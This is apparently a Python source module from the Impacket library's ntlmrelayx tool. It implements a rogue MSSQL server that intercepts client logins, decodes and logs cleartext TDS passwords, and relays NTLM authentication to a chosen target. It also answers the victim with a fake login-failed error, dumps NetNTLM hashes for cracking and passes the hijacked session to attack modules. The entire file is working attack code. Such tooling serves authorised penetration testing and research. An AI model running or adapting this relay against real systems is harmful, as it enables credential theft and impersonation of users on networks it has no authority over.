# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   MS SQL Relay Server 
#
#   This is the MSSQL server that relays the connections
#   to other protocols. 
#
#   Based on RAW Relay Server.
#
# Authors:
#   Eugenie Potseluevskaya
#

import socketserver
import random
import string
import struct
from threading import Thread

from impacket import ntlm, tds, LOG
from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
from impacket.examples.utils import parse_target
from impacket.nt_errors import STATUS_SUCCESS
from impacket.ntlm import NTLMAuthChallenge
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
from impacket.examples.utils import get_address

class MSSQLRelayServer(Thread):

    class MSSQLServer(socketserver.ThreadingMixIn, socketserver.TCPServer):

        def __init__(self, server_address, RequestHandlerClass, config):
            self.config = config
            self.daemon_threads = True
            self.address_family, server_address = get_address(server_address[0], server_address[1], self.config.ipv6)
            socketserver.TCPServer.allow_reuse_address = True
            socketserver.TCPServer.__init__(self, server_address, RequestHandlerClass)

    class MSSQLHandler(socketserver.BaseRequestHandler):

        def __init__(self, request, client_address, server):
            self.server = server
            self.challengeMessage = None
            self.target = None
            self.client = None
            self.authUser = None
            self.client_address = None
            
            self.target = self.server.config.target.getTarget()
            if self.target is None:
                LOG.info("(MSSQL): Received connection from %s, but there are no more targets left!" % client_address[0])
                return            
                
            LOG.info("(MSSQL): Received connection from %s, attacking target %s://%s" % (client_address[0] ,self.target.scheme, self.target.netloc))

            self.client_address = client_address[0]            
            
            if ':' in self.target.netloc:
                target_string,port=self.target.netloc.split(':')
                self.target_port=int(port)
            else:
                target_string=self.target.netloc
                self.target_port=1433
            
            domain, username, password, remoteName = parse_target(target_string)
            
            if domain is None:
                domain = ''
                
            self.remoteName = remoteName
               
            super().__init__(request, client_address, server)
            
        def init_client(self):
            if self.target.scheme.upper() in self.server.config.protocolClients:
                client = self.server.config.protocolClients[self.target.scheme.upper()](self.server.config, self.target, extendedSecurity = True)
                if not client.initConnection():
                    raise Exception('Could not initialize connection')
            else:
                raise Exception('Protocol Client for %s not found!' % self.target.scheme)
            return client            
            
        def decryptPassword(self, password):
            return bytes((((x ^ 0xA5) & 0x0F) << 4) | (((x ^ 0xA5) & 0xF0) >> 4) for x in bytearray(password))
            
        def sendNegotiate(self,negotiateMessage):
            # Changed from the version in mssqlrelayclient.py to use the same parameters as 
            # the original request and change the database
            login = tds.TDS_LOGIN()

            login['HostName'] = (''.join([random.choice(string.ascii_letters) for _ in range(8)])).encode('utf-16le')
            login['AppName']  = self.login['AppName']
            login['ServerName'] = self.target.hostname.encode('utf-16le')
            login['CltIntName']  = self.login['AppName']
            login['ClientPID'] = random.randint(0, 1024)
            login['PacketSize'] = self.client.session.packetSize
            if self.server.config.database:
                LOG.info("(MSSQL): Changing the database to %s" % self.server.config.database)
                login['Database'] = self.server.config.database.encode('utf-16le')
            else:
                LOG.debug("(MSSQL): Removed the original database: %s, the database is empty now. Change the --mssql-db setting if you want to specify the database" % self.login['Database'].decode("utf-8"))
                login['Database'] = b''
            login['OptionFlags2'] = tds.TDS_INIT_LANG_FATAL | tds.TDS_ODBC_ON | tds.TDS_INTEGRATED_SECURITY_ON

            # NTLMSSP Negotiate
            login['SSPI'] = negotiateMessage
            login['Length'] = len(login.getData())

            # Send the NTLMSSP Negotiate
            self.client.session.sendTDS(tds.TDS_LOGIN7, login.getData())

            # According to the specs, if encryption is not required, we must encrypt just
            # the first Login packet :-o
            if self.client.session.resp['Encryption'] == tds.TDS_ENCRYPT_OFF:
                self.client.session.tlsSocket = None

            tds_response = self.client.session.recvTDS()
            self.client.session.sessionData['NTLM_CHALLENGE'] = tds_response

            challenge = NTLMAuthChallenge()
            challenge.fromString(tds_response['Data'][3:])

            return challenge            
          
        def handle(self):            
            try:
                while True:
                    # Receive packet from the client
                    packet = self.request.recv(65535)
                    if not packet:
                        break
                    
                    if packet[0] == tds.TDS_PRE_LOGIN:         # Pre-login stage
                    
                        LOG.debug("(MSSQL): Receieved TDS pre-login from client")
                        self.client = self.init_client()
                        LOG.debug("(MSSQL): Sending our own TDS pre-login response to client")
                        preloginResponseData = tds.TDS_PRELOGIN()
                        preloginResponseData["Version"] = b"\x0f\x00\x11\x3a\x00\x00"
                        # We specify we do not support encryption
                        preloginResponseData["Encryption"] = tds.TDS_ENCRYPT_NOT_SUP
                        # InstOpt is 0, we confirm that the client's InstOpt matches the server's instance
                        preloginResponseData["Instance"] = b"\x00"                        
                        # ThreadId is empty in the server response
                        preloginResponseData["ThreadID"] = b""
                        preloginResponseData["ThreadIDLength"] = 0
                        
                        preloginResponse = tds.TDSPacket()
                        preloginResponse["Type"] = tds.TDS_TABULAR
                        preloginResponse["Data"] = preloginResponseData.getData()
                        
                        self.request.send(preloginResponse.getData())                      
                        
                    elif packet[0] == tds.TDS_LOGIN7:    # Login stage
                    
                        LOG.debug("(MSSQL): Parsing the client's login request")
                        loginData = tds.TDS_LOGIN()
                        loginData.fromString(packet[8:])
                        LOG.info("(MSSQL): Client login request:")
                        if loginData["HostName"]:
                            LOG.debug("(MSSQL): Hostname    : %s" % loginData["HostName"].decode("utf-8"))
                        if loginData["ServerName"]:
                            LOG.debug("(MSSQL): Server Name : %s" % loginData["ServerName"].decode("utf-8"))
                        if loginData["CltIntName"]:
                            LOG.debug("(MSSQL): Client Name : %s" % loginData["CltIntName"].decode("utf-8")) 
                        if loginData["AppName"]:
                            LOG.debug("(MSSQL): App Name    : %s" % loginData["AppName"].decode("utf-8"))                                               
                        if loginData["Database"]:
                            LOG.debug("(MSSQL): Database    : %s" % loginData["Database"].decode("utf-8"))
                        if loginData["UserName"]:
                            LOG.debug("(MSSQL): Username    : %s" % loginData["UserName"].decode("utf-8"))
                        if loginData["Password"]:
                            password = self.decryptPassword(loginData["Password"])
                            LOG.info("(MSSQL): Password    : %s" % password.decode("utf-8"))
                            LOG.info("(MSSQL): Password is not empty. Relay is not required.")
                        if not loginData["SSPI"]:
                            LOG.error("(MSSQL): NTLMSSP_NEGOTIATE not found in login message")
                            break                        
                        negotiateMessage = loginData["SSPI"]
                        self.login = loginData
                        # For MSSQL, we change the database and target server name
                        if (self.target.scheme.upper() == "MSSQL"):
                            self.client.sendNegotiate = self.sendNegotiate
                                
                        self.challengeMessage = self.client.sendNegotiate(negotiateMessage)
                        challenge = bytes.fromhex(str(self.challengeMessage))

                        tds_response = tds.TDSPacket()
                        tds_response['Type'] = tds.TDS_TABULAR
                        tds_response['Status'] = tds.TDS_STATUS_EOM
                        tds_response['PacketID'] = 0
                        # TDS_SSPI token + little-endian length + payload
                        tds_response['Data'] = struct.pack('<BH', tds.TDS_SSPI_TOKEN, len(challenge)) + challenge

                        self.request.send(tds_response.getData())
                        
                    elif packet[0] == tds.TDS_SSPI:    # NTLM authentication
                        LOG.debug("(MSSQL): Sending our own error response to the client")
                        responseData = tds.TDS_INFO_ERROR()
                        msg = "Login failed for user ''.".encode('utf-16le')
                        server = "MSSQLSERVER".encode('utf-16le')
                        proc = b""
                        responseData['TokenType'] = tds.TDS_ERROR_TOKEN   
                        responseData['Number'] = 18456                    # Login failed
                        responseData['State'] = 1
                        responseData['Class'] = 14
                        responseData['MsgText'] = msg
                        responseData['MsgTextLen'] = len(msg) // 2
                        responseData['ServerName'] = server                       
                        responseData['ServerNameLen'] = len(server) // 2
                        responseData['ProcName'] = proc
                        responseData['ProcNameLen'] = len(proc) // 2
                        responseData['LineNumber'] = 1
                        
                        responseData['Length'] = 16 + len(msg) + len(server) + len(proc)
                        
                        doneData = tds.TDS_DONE()
                        doneData['TokenType'] = tds.TDS_DONE_TOKEN
                        doneData['Status'] = 0x02 # TDS_DONE_ERROR 
                        doneData['CurCmd'] = 0
                        doneData['DoneRowCount'] = 0
                        
                        responsePacket = tds.TDSPacket()
                        responsePacket["Type"] = tds.TDS_TABULAR
                        responsePacket["Data"] = responseData.getData() + doneData.getData()
                                                
                        self.request.send(responsePacket.getData())
                        authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                        authenticateMessage.fromString(packet[8:])
                        LOG.debug("(MSSQL): Relaying authentication to server")
                        
                        if not STATUS_SUCCESS in self.client.sendAuth(packet[8:]):
                            if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                                LOG.error("(MSSQL): Authenticating against %s://%s as %s/%s FAILED" % (
                                    self.target.scheme, self.target.netloc,
                                    authenticateMessage['domain_name'].decode('utf-16le'),
                                    authenticateMessage['user_name'].decode('utf-16le')))
                            else:
                                LOG.error("(MSSQL): Authenticating against %s://%s as %s/%s FAILED" % (
                                    self.target.scheme, self.target.netloc,
                                    authenticateMessage['domain_name'].decode('ascii'),
                                    authenticateMessage['user_name'].decode('ascii')))                          
                            
                        else:
                            # Relay worked, do whatever we want here...                                
                            self.client.setClientId()
                            if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                                LOG.info("(MSSQL): Authenticating connection from %s/%s@%s against %s://%s SUCCEED [%s]" % (
                                    authenticateMessage['domain_name'].decode('utf-16le'), authenticateMessage['user_name'].decode('utf-16le'),
                                    self.client_address[0], self.target.scheme, self.target.netloc, self.client.client_id))
                            else:
                                LOG.info("(MSSQL): Authenticating connection from %s/%s@%s against %s://%s SUCCEED [%s]" % ( authenticateMessage['domain_name'].decode('ascii'), authenticateMessage['user_name'].decode('ascii'), self.client_address[0], self.target.scheme, self.target.netloc, self.client.client_id))

                            ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'],
                                                        authenticateMessage['user_name'],
                                                        authenticateMessage['domain_name'],
                                                        authenticateMessage['lanman'], authenticateMessage['ntlm'])
                            self.client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data

                            if self.server.config.dumpHashes is True:
                                LOG.info("(RAW): %s" % ntlm_hash_data['hash_string'])

                            if self.server.config.outputFile is not None:
                                writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                              self.server.config.outputFile)
                            
                            self.authUser = authenticateMessage.getUserString()

                            self.server.config.target.registerTarget(self.target, True, self.authUser)                            
                            
                            self.do_attack()
                    else:
                        LOG.error("(MSSQL): Something went wrong")
                        break

            except Exception as e:
                LOG.info("(MSSQL): An error occurred during packet capture: %s" % e )

        def do_attack(self):
            # Check if SOCKS is enabled and if we support the target scheme
            
            if self.server.config.runSocks and self.target.scheme.upper() in self.server.config.socksServer.supportedSchemes:
                # Pass all the data to the socksplugins proxy
                activeConnections.put((self.target.hostname, self.client.targetPort, self.target.scheme.upper(),
                                       self.authUser, self.client, self.client.sessionData))
                return

            # If SOCKS is not enabled, or not supported for this scheme, fall back to "classic" attacks
            if self.target.scheme.upper() in self.server.config.attacks:
                # We have an attack.. go for it
                clientThread = self.server.config.attacks[self.target.scheme.upper()](self.server.config, self.client.session,self.authUser, self.target, self.client)
                clientThread.start()
            else:
                LOG.error('(MSSQL): No attack configured for %s' % self.target.scheme.upper())

    def __init__(self, config):
        Thread.__init__(self)
        self.daemon = True
        self.config = config
        self.server = None

    def run(self):

        if self.config.listeningPort:
            mssqlport = self.config.listeningPort
        else:
            mssqlport = 1433
            
        LOG.info("Setting up MSSQL Server on port " + str(mssqlport))            

        # changed to read from the interfaceIP set in the configuration
        self.server = self.MSSQLServer((self.config.interfaceIp, mssqlport), self.MSSQLHandler, self.config)

        try:
             self.server.serve_forever()
        except KeyboardInterrupt:
             pass
        LOG.info('Shutting down MSSQL Server')
        self.server.server_close()
